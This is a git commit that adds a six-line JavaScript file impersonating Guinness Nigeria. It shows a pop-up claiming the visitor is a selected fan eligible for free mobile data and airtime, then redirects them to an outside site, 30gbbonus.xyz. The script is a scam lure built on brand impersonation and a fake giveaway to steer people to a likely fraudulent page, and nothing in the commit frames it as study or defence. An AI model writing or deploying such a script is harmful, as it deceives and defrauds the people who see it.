d27e33404fbb891a9535d2ed8e016edd85e872cf
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-10-06 14:07:48 -0700

    Create guiness.js

---
+++ guiness.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 20GB + AIRTIME '
+password=prompt('GUINNESS Nigeria: Hello, you are among the selected bbn fans to benefit from this offer. Press Ok to get offer now ','ACTIVATE 20GB + AIRTIME');
+if (password != 'ACTIVATE 20GB + AIRTIME') {
+location.href='https://30gbbonus.xyz/20gb-offer.html';
+}
